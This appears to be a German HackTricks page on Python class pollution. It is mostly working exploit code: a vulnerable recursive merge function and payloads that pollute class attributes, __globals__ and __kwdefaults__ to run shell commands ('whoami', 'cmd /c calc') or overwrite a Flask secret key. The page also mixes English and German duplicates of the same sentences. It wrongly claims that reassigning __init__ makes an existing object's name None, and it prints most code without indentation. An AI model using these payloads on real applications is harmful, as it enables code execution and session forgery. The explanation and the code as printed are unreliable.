# Klassenverschmutzung (Python's Prototype Pollution)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Grundlegendes Beispiel

Überprüfen Sie, wie es möglich ist, Klassen von Objekten mit Zeichenketten zu verschmutzen:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Grundlegendes Beispiel für eine Schwachstelle

Consider the following Python code:

Betrachten Sie den folgenden Python-Code:

```python
class Person:
    def __init__(self, name):
        self.name = name

person = Person("Alice")
print(person.name)

Person.__init__ = lambda self, name: None

print(person.name)
```

In this code, we have a `Person` class with an `__init__` method that initializes the `name` attribute. We create an instance of the `Person` class called `person` and print the value of the `name` attribute.

In diesem Code haben wir eine `Person`-Klasse mit einer `__init__`-Methode, die das `name`-Attribut initialisiert. Wir erstellen eine Instanz der `Person`-Klasse namens `person` und geben den Wert des `name`-Attributs aus.

However, in the next line, we modify the `__init__` method of the `Person` class to a lambda function that does nothing. We then print the value of the `name` attribute again.

Jedoch ändern wir in der nächsten Zeile die `__init__`-Methode der `Person`-Klasse zu einer Lambda-Funktion, die nichts tut. Anschließend geben wir den Wert des `name`-Attributs erneut aus.

The output of this code will be:

Die Ausgabe dieses Codes wird sein:

```
Alice
None
```

As we can see, after modifying the `__init__` method, the value of the `name` attribute becomes `None`, even though we didn't explicitly change it.

Wie wir sehen können, wird nach der Modifikation der `__init__`-Methode der Wert des `name`-Attributs zu `None`, obwohl wir ihn nicht explizit geändert haben.

This is an example of class pollution or prototype pollution vulnerability in Python. By modifying a class's methods or attributes, an attacker can introduce unexpected behavior or modify the state of an object without the knowledge or consent of the original code.

Dies ist ein Beispiel für eine Klassenverunreinigung oder Prototypenverunreinigung in Python. Durch die Modifikation von Methoden oder Attributen einer Klasse kann ein Angreifer unerwartetes Verhalten einführen oder den Zustand eines Objekts ohne das Wissen oder die Zustimmung des ursprünglichen Codes ändern.
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Beispiele für Gadgets

<details>

<summary>Erstellen eines Klassenattribut-Standardwerts für RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Verschmutzung anderer Klassen und globaler Variablen über <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
<details>

<summary>Beliebige Unterprozessausführung</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Überschreiben von <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** ist ein spezielles Attribut aller Funktionen. Laut der Python [Dokumentation](https://docs.python.org/3/library/inspect.html) handelt es sich um eine "Zuordnung von Standardwerten für **nur Schlüsselwort**-Parameter". Durch das Verunreinigen dieses Attributs können wir die Standardwerte der nur Schlüsselwort-Parameter einer Funktion kontrollieren. Diese Parameter sind diejenigen, die nach \* oder \*args in der Funktion kommen.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Überschreiben des Flask-Secrets über mehrere Dateien hinweg</summary>

Wenn Sie also eine Klassenverunreinigung über ein in der Haupt-Python-Datei der Webanwendung definiertes Objekt durchführen können, dessen Klasse jedoch in einer anderen Datei definiert ist. Da Sie in den vorherigen Payloads auf \_\_globals\_\_ zugreifen müssen, um auf die Klasse des Objekts oder auf Methoden der Klasse zuzugreifen, können Sie **auf die Globals in dieser Datei zugreifen, aber nicht in der Hauptdatei**. \
Daher werden Sie **nicht auf das Flask-App-Globalobjekt zugreifen können**, das den **Secret Key** auf der Hauptseite definiert hat:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In diesem Szenario benötigen Sie ein Gerät, um Dateien zu durchsuchen und zur Hauptdatei zu gelangen, um auf das globale Objekt `app.secret_key` zuzugreifen und den Flask-Schlüssel zu ändern. Dadurch können Sie [Berechtigungen eskalieren](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign), indem Sie diesen Schlüssel kennen.

Ein Payload wie dieser [aus diesem Writeup](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Verwenden Sie dieses Payload, um `app.secret_key` (der Name in Ihrer App kann unterschiedlich sein) zu ändern, um neue und privilegiertere Flask-Cookies signieren zu können.

</details>

Überprüfen Sie auch die folgende Seite für weitere schreibgeschützte Gadgets:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Referenzen

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
